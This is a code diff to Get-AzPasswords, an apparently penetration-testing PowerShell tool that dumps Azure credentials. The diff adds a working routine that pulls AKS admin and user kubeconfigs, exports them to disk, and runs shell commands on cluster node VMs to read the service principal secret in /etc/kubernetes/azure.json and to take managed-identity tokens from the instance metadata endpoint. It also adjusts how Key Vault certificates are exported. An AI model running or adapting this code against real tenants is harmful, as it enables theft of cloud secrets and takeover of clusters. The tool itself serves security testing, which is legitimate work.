@@ -49,8 +49,7 @@ Function Get-AzPasswords
         VERBOSE: Password Dumping Activities Have Completed
 
     .LINK
-    https://blog.netspi.com/get-azurepasswords
-    https://blog.netspi.com/exporting-azure-runas-certificates
+    https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/    
 #>
 
 
@@ -99,6 +98,16 @@ Function Get-AzPasswords
         [ValidateSet("Y","N")]
         [String]$CosmosDB = "Y",
 
+        [parameter(Mandatory=$false,
+        HelpMessage="Dump AKS clusterAdmin and clusterUser kubeconfig files.")]
+        [ValidateSet("Y","N")]
+        [String]$AKS = "Y",
+
+        [parameter(Mandatory=$false,
+        HelpMessage="Export the AKS kubeconfigs to local files.")]
+        [ValidateSet("Y","N")]
+        [String]$ExportKube = "N",
+
         [Parameter(Mandatory=$false,
         HelpMessage="Export the Key Vault certificates to local files.")]
         [ValidateSet("Y","N")]
@@ -124,7 +133,7 @@ Function Get-AzPasswords
         # List subscriptions, pipe out to gridview selection
         $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB}
+        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS}
         break
     }
 
@@ -329,7 +338,7 @@ Function Get-AzPasswords
                     # Write Private Certs to file
                     if (($ExportCerts -eq "Y") -and ($secretType  -eq "application/x-pkcs12")){
                             Write-Verbose "`t`t`tWriting certificate for $secretname to $pwd\$secretname.pfx"
-                            $secretBytes = [convert]::FromBase64String($secretValue.SecretValueText)
+                            $secretBytes = [convert]::FromBase64String(($secretValue.SecretValue| ConvertFrom-SecureString))
                             [IO.File]::WriteAllBytes("$pwd\$secretname.pfx", $secretBytes)
                         }
 
@@ -571,7 +580,7 @@ Function Get-AzPasswords
 
 #============================ Start Automation Script Execution =============================#
             # No creds handle
-            if (($autoCred -eq $null) -and ($jobList -eq $null)){Write-Verbose "No Connections or Credentials configured for $verboseName Automation Account"}
+            if (($autoCred -eq $null) -and ($jobList -eq $null)){Write-Verbose "`tNo Connections or Credentials configured for $verboseName Automation Account"}
 
             # If there's no connection jobs, don't run any
             if ($jobList.Count -ne $null){
@@ -636,7 +645,11 @@ Function Get-AzPasswords
                 foreach ($jobToRun in $jobList2){
                     # If the additional runbooks didn't write, don't run them
                     if (Test-Path $pwd\$jobToRun.ps1 -PathType Leaf){
-                        $autoCredCurrent = $autoCred[$autoCredIter]
+                        if($autoCred.Count -gt 1){
+                            $autoCredCurrent = $autoCred[$autoCredIter]
+                        }
+                        else{$autoCredCurrent = $autoCred}
+
                         Write-Verbose "`t`tGetting cleartext credentials for $autoCredCurrent using the $jobToRun.ps1 Runbook"
                         $autoCredIter++
                         try{
@@ -715,6 +728,109 @@ Function Get-AzPasswords
                 $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-SecondaryMasterKey"),"N/A",$cDBkeys.SecondaryMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null                
             }
         }
+    }
+
+    if ($AKS -eq 'Y'){
+        # AKS Cluster Section
+         Write-Verbose "Getting List of Azure Kubernetes Service Clusters..."
+         
+        $SubscriptionId = ((Get-AzContext).Subscription).Id
+
+        # Get a list of Clusters
+        $clusters = Get-AzAksCluster
+
+        # Get a token for the API
+        $bearerToken = (Get-AzAccessToken).Token
+
+        $clusters | ForEach-Object{
+            $clusterID = $_.Id
+            $currentCluster = $_.Name
+
+            Write-Verbose "`tGetting the clusterAdmin kubeconfig files for the $currentCluster AKS Cluster"
+            # For each cluster, get the admin creds
+            $clusterAdminCreds = ((Invoke-WebRequest -Uri (-join ('https://management.azure.com',$clusterID,'/listClusterAdminCredential?api-version=2021-05-01')) -Verbose:$false -Method POST -Headers @{ Authorization ="Bearer $bearerToken"} -UseBasicParsing).Content)
+            $clusterAdminCredFile = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((($clusterAdminCreds | ConvertFrom-Json).kubeConfigs).value))
+
+            # Add creds to the table
+            $TempTblCreds.Rows.Add("AKS Cluster Admin ",$currentCluster,"clusterAdmin",$clusterAdminCredFile,"N/A","N/A","N/A","N/A","Kubeconfig-File","N/A",$subName) | Out-Null
+
+            Write-Verbose "`tGetting the clusterUser kubeconfig files for the $currentCluster AKS Cluster"
+            # For each cluster, get the user creds
+            $clusterUserCreds = ((Invoke-WebRequest -Uri (-join ('https://management.azure.com',$clusterID,'/listClusterUserCredential?api-version=2021-05-01')) -Verbose:$false -Method POST -Headers @{ Authorization ="Bearer $bearerToken"} -UseBasicParsing).Content)
+            $clusterUserCredFile = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((($clusterUserCreds | ConvertFrom-Json).kubeConfigs).value))
+            
+            # Add creds to the table
+            $TempTblCreds.Rows.Add("AKS Cluster User ",$currentCluster,"clusterUser",$clusterUserCredFile,"N/A","N/A","N/A","N/A","Kubeconfig-File","N/A",$subName) | Out-Null
+
+            if($ExportKube -eq 'Y'){
+                $clusterAdminCredFile | Out-File -FilePath (-join('.\',$currentCluster,'-clusterAdmin.kubeconfig'))
+                $clusterUserCredFile | Out-File -FilePath (-join('.\',$currentCluster,'-clusterUser.kubeconfig'))
+            }
+
+            # Cluster Configuration File Retrieval
+            $nodeRG = $_.NodeResourceGroup
+            $nodeVMSS = (Get-AzResource -ResourceGroupName $nodeRG | where ResourceType -EQ "Microsoft.Compute/virtualMachineScaleSets").Name
+
+            if($_.Identity -eq $null){
+
+                Write-Verbose "`tGetting the cluster service principal credentials from the $currentCluster AKS Cluster"
+                
+                # Assumes Linux Clusters
+                "cat /etc/kubernetes/azure.json" | Out-File ".\tempscript"
+            
+                # Run command on the VMSS cluster            
+                $commandOut = (Invoke-AzVmssVMRunCommand -ResourceGroupName $nodeRG -VMScaleSetName $nodeVMSS -InstanceId 0 -ScriptPath ".\tempscript" -CommandId RunShellScript)
+
+                # Write to file to correct the "ucs-2 le bom" encoding on the command output
+                $commandOut.Value[0].Message | Out-File ".\spTempFile" -Encoding utf8
+                $utf8String = gc ".\spTempFile"
+
+                # Convert azure.json file to JSON object
+                $jsonSP = $utf8String[2..(($utf8String.Length)-4)] | ConvertFrom-Json
+
+                # Cast IDs and Secret to table variables
+                $tenantId = (-join("Tenant ID: ",$jsonSP.tenantId))
+                $aadClientId = (-join("Client ID: ",$jsonSP.aadClientId))
+                $aadClientSecret = (-join("Client Secret: ",$jsonSP.aadClientSecret))
+
+                # Add creds to the table
+                $TempTblCreds.Rows.Add("AKS Cluster Service Principal ",$currentCluster,$aadClientId,$aadClientSecret,$tenantId,"N/A","N/A","N/A","AKS-ServicePrincipal","N/A",$subName) | Out-Null
+            
+                # Delete Temp Files
+                del ".\spTempFile"
+                del ".\tempscript"
+            }
+            else{
+                Write-Verbose "`tGetting the Managed Identity Token from the $currentCluster AKS Cluster"
+
+                # Assumes Linux Clusters
+                "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:'true'" | Out-File ".\tempscript2"
+            
+                # Run command on the VMSS cluster            
+                $commandOut = (Invoke-AzVmssVMRunCommand -ResourceGroupName $nodeRG -VMScaleSetName $nodeVMSS -InstanceId 0 -ScriptPath ".\tempscript2" -CommandId RunShellScript)
+
+                # Write to file to correct the "ucs-2 le bom" encoding on the command output
+                $commandOut.Value[0].Message | Out-File ".\spTempFile2" -Encoding utf8
+                $utf8String = gc ".\spTempFile2"
+
+                # Convert commandOutput file to JSON object
+                $jsonSP = $utf8String[2..(($utf8String.Length)-8)] | ConvertFrom-Json
+
+                # Cast IDs and Secret to table variables
+                $accessToken = (-join("Access Token: ",$jsonSP.access_token))
+                $clientID = (-join("Client ID: ",$jsonSP.client_id))
+
+                # Add creds to the table
+                $TempTblCreds.Rows.Add("AKS Cluster Service Principal ",$currentCluster,$clientID,$accessToken,"N/A","N/A","N/A","N/A","AKS-ManagedIdentity","N/A",$subName) | Out-Null
+            
+                # Delete Temp Files
+                del ".\spTempFile2"
+                del ".\tempscript2"
+
+            }
+
+        }
+
     }
 
     Write-Verbose "Password Dumping Activities Have Completed"
